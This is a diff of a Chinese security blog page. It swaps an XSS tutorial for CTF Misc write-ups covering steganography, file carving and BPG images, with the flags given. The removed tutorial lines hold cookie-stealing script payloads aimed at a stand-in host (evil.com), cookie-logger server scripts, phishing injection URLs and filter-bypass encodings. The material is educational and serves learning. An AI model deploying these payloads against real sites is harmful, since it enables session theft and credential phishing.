@@ -22,23 +22,31 @@
     var CONFIG = {"hostname":"zhoufish.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="简介跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。">
+  <meta name="description" content="Misc今日刷题">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss跨站脚本漏洞">
-<meta property="og:url" content="http://zhoufish.com/2022/XSS/index.html">
+<meta property="og:title" content="每日Misc一">
+<meta property="og:url" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/index.html">
 <meta property="og:site_name" content="卷心菜">
-<meta property="og:description" content="简介跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。">
+<meta property="og:description" content="Misc今日刷题">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhoufish.com/2022/XSS/image-20220316233924916.png">
-<meta property="og:image" content="http://zhoufish.com/2022/XSS/image-20220316233332570.png">
-<meta property="article:published_time" content="2022-03-16T15:02:50.000Z">
-<meta property="article:modified_time" content="2022-03-19T10:51:53.682Z">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323171906-ruminau.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323172027-8sps4f5.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174648-aruer40.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174925-skni7fq.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323184625-tpa6e7y.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/challenge-20220323191325-4k6iank.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323192137-vmw1qbm.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323193906-tlc0e0a.png">
+<meta property="og:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323194144-o0hlquy.png">
+<meta property="article:published_time" content="2022-03-23T12:38:46.000Z">
+<meta property="article:modified_time" content="2022-03-23T12:50:18.629Z">
 <meta property="article:author" content="欣喜">
-<meta property="article:tag" content="web">
+<meta property="article:tag" content="Misc">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhoufish.com/2022/XSS/image-20220316233924916.png">
+<meta name="twitter:image" content="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png">
 
-<link rel="canonical" href="http://zhoufish.com/2022/XSS/">
+<link rel="canonical" href="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/">
 
 
 <script id="page-configurations">
@@ -51,7 +59,7 @@
   };
 </script>
 
-  <title>xss跨站脚本漏洞 | 卷心菜</title>
+  <title>每日Misc一 | 卷心菜</title>
   
 
 
@@ -194,7 +202,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zhoufish.com/2022/XSS/">
+    <link itemprop="mainEntityOfPage" href="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -207,7 +215,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          xss跨站脚本漏洞
+          每日Misc一
         </h1>
 
         <div class="post-meta">
@@ -216,23 +224,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2022-03-16 23:02:50" itemprop="dateCreated datePublished" datetime="2022-03-16T23:02:50+08:00">2022-03-16</time>
+              <time title="创建时间：2022-03-23 20:38:46 / 修改时间：20:50:18" itemprop="dateCreated datePublished" datetime="2022-03-23T20:38:46+08:00">2022-03-23</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-19 18:51:53" itemprop="dateModified" datetime="2022-03-19T18:51:53+08:00">2022-03-19</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                  <a href="/categories/BUUCTF-Misc/" itemprop="url" rel="index"><span itemprop="name">BUUCTF(Misc)</span></a>
                 </span>
             </span>
 
@@ -249,7 +251,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.4k</span>
+              <span>1.7k</span>
             </span>
 
         </div>
@@ -261,89 +263,83 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>今日刷题</p>
 <span id="more"></span>
 
-<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
-<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
-<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p><img src="/2022/XSS/image-20220316233924916.png"></p>
- 
+<h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png"></p>
+<p>一张图片</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
+<li>文件分离</li>
+<li>ELF文件</li>
+</ul>
+<p>命令：file、binwalk、foremost</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>文件题目是file carving</p>
+<p>第一时间kali查看文件，发现有其他文件，进行文件分离</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323171906-ruminau.png"></p>
+<p>分离文件中有压缩包，解压得到文件</p>
+<p>使用file命令发现是ELF文件，运行得到flag</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323172027-8sps4f5.png"></p>
+<h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到题</p>
+<p>下载解压查看</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Challenge description:</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">I really hope you are INSAne, but if that&#x27;s not the case </span></span><br><span class="line"><span class="attribute">and that you don&#x27;t want to validate the &quot;INSAnity&quot; challenge </span></span><br><span class="line"><span class="attribute">then maybe you would like to validate this one? </span></span><br><span class="line"><span class="attribute">Here is your flag, you disapointing and boring fellow</span><span class="punctuation">: </span></span><br><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
-<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p><img src="/2022/XSS/image-20220316233332570.png"></p>
- 
+<h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
+<li>Steghide隐写</li>
+<li>png文件头</li>
+<li>unicode编码</li>
+</ul>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>音频隐写的方式，但是没有密码或者Key。文件分离，也没有发现。听，也没有发现什么信息。</p>
+<p>想到<code>Steghide</code>是一个可以将文件隐藏到图片或音频中的工具，使用命令：<code>steghide extract -sf out.wav </code>（无密码）</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">┌──(root💀kali)-[~/桌面/CTF/MISC]</span></span><br><span class="line"><span class="attribute">└─# steghide extract -sf out.wav </span></span><br><span class="line"><span class="attribute">Enter passphrase</span><span class="punctuation">: </span></span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
-<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
-<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
-<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
-<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
-<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
-<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
-<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
-<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
-<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
+<p>查看文件得到一个网址：<a target="_blank" rel="noopener" href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a></p>
+<p>打开网站。下载得到图片</p>
+<p>图片损坏不能正常显示，用010查看文件，文件头错误 </p>
+<p><code>89 50 4E 47</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174648-aruer40.png"></p>
+<p>打开得到编码</p>
+<p><code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p>
+<p>unicode解码得到</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174925-skni7fq.png"></p>
+<p>经过尝试，把两个数字相加，出题人鬼才，得到flag{5304}</p>
+<h2 id="BUUCTF-voip"><a href="#BUUCTF-voip" class="headerlink" title="BUUCTF voip"></a>BUUCTF voip</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>流量包分析</li>
+<li>voip通话</li>
+</ul>
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>打开流量包</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323184625-tpa6e7y.png"></p>
+<p>在voip通话之中有英语听力，flag就在里面。考听力。</p>
+<p> flag{9001IVR}</p>
+<h2 id="BUUCTF-Business-Planning-Group"><a href="#BUUCTF-Business-Planning-Group" class="headerlink" title="BUUCTF Business Planning Group"></a>BUUCTF Business Planning Group</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>BPG图片</li>
+<li>图片隐写</li>
+<li>base64编码</li>
+</ul>
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>得到图片</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/challenge-20220323191325-4k6iank.png"></p>
+<p>用binwalk、foremost 也没得到有用的信息。</p>
+<p>在010查看发现文件尾有个BPG</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323192137-vmw1qbm.png"></p>
+<p><strong>维基百科</strong></p>
+<p><strong>BPG</strong>格式，全称“<strong>Better Portable Graphics</strong>”（更好的便携式图像），它是一个声称比现时最流行的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>压缩格式更优秀的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%83%8F%E5%8E%8B%E7%BC%A9" title="图像压缩">图像压缩</a>方案，由法国的程序员<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%B8%83%E9%87%8C%E6%96%AF%C2%B7%E8%B4%9D%E6%8B%89" title="法布里斯·贝拉">法布里斯·贝拉</a>（Fabrice Bellard）于2014年创建。他将影像编码格式中的技术运用到了图像编码，以达至更理想的压缩比率，而不同于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>为提高压缩比而牺牲画质的方式 ^<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/BPG#cite_note-bellard-1">[1]</a>^^<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/BPG#cite_note-techbang-2">[2]</a>^ 。该影像编码格式基于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%95%88%E7%8E%87%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81" title="高效率视频编码">高效率视频编码</a>（HEVC）的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%B9%80%E5%85%A7%E7%B7%A8%E7%A2%BC" title="帧内编码">帧内编码</a>技术改良而成。</p>
+<p><strong>BPG (Better Portable Graphics)</strong> 是一个新的图片格式，目的是保证质量或者文件大小限制的情况下替换 JPEG 格式，主要特性：</p>
 <ul>
-<li><strong>重定向钓鱼</strong></li>
+<li>高压缩率</li>
+<li>支持大部分 Web 浏览器，带有一个小的 JavaScript 解码器 (gzipped size: 56 KB).</li>
+<li>基于 <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/High_Efficiency_Video_Coding">HEVC</a> 开放视频压缩标准的子集</li>
+<li>支持跟 JPEG 的相同色度(grayscale, YCbCr 4:2:0, 4:2:2, 4:4:4) ，降低转换损失</li>
+<li>原生支持每通道 8 到 14 位，更好的动态范围</li>
+<li>支持无损压缩</li>
+<li>各种元数据</li>
+<li>支持动态</li>
 </ul>
-<p>将当前访问重定向到一个钓鱼网页</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>HTML注入式钓鱼</strong></li>
-</ul>
-<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>iframe钓鱼</strong></li>
-</ul>
-<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>Flash钓鱼</strong></li>
-</ul>
-<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
-<ul>
-<li><p>高级钓鱼技术</p>
-<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
-</li>
-</ul>
-<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
-<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
-<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
-<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
-<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
-<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
-<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
-<li><strong>HTML实体编码</strong></li>
-</ul>
-<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
-<p>字符编码</p>
-<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
-<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
-<ul>
-<li><strong>URL编码</strong></li>
-</ul>
-<p>两次URL全编码</p>
-<ul>
-<li><strong><code>String.fromCharCode</code>编码</strong></li>
-</ul>
-<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
-<p>XSS绕过也可以看看该文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
-<hr>
-<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
+<p>正常windows没有办法识别BPG</p>
+<p>用工具：<a target="_blank" rel="noopener" href="https://bellard.org/bpg/bpg-0.9.8-win64.zip">https://bellard.org/bpg/bpg-0.9.8-win64.zip</a></p>
+<p>命令：<code>.\bpgview.exe .\1.bpg</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323193906-tlc0e0a.png"></p>
+<p><code>YnNpZGVzX2RIbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg==</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323194144-o0hlquy.png"></p>
+<p>bsides_dHlhi{BPG_i5_b3tt3r_7h4n_JPG}</p>
 
     </div>
 
@@ -359,7 +355,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://zhoufish.com/2022/XSS/" title="xss跨站脚本漏洞">http://zhoufish.com/2022/XSS/</a>
+    <a href="http://zhoufish.com/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/" title="每日Misc一">http://zhoufish.com/2022/每日Misc一/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -389,7 +385,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/web/" rel="tag"><i class="fa fa-tags"></i> web</a>
+              <a href="/tags/Misc/" rel="tag"><i class="fa fa-tags"></i> Misc</a>
           </div>
 
         
@@ -398,13 +394,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/" rel="prev" title="Misc小合集（一）">
-      <i class="fa fa-chevron-left"></i> Misc小合集（一）
+    <a href="/2022/XSS/" rel="prev" title="xss跨站脚本漏洞">
+      <i class="fa fa-chevron-left"></i> xss跨站脚本漏洞
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/" rel="next" title="每日Misc一">
-      每日Misc一 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -477,7 +470,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">XSS分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%88%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">存储型 XSS（持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%88%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">反射型 XSS（非持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-DOM-%E7%9A%84-XSS"><span class="nav-number">2.3.</span> <span class="nav-text">基于 DOM 的 XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">XSS利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookies%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">Cookies利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="nav-number">3.2.</span> <span 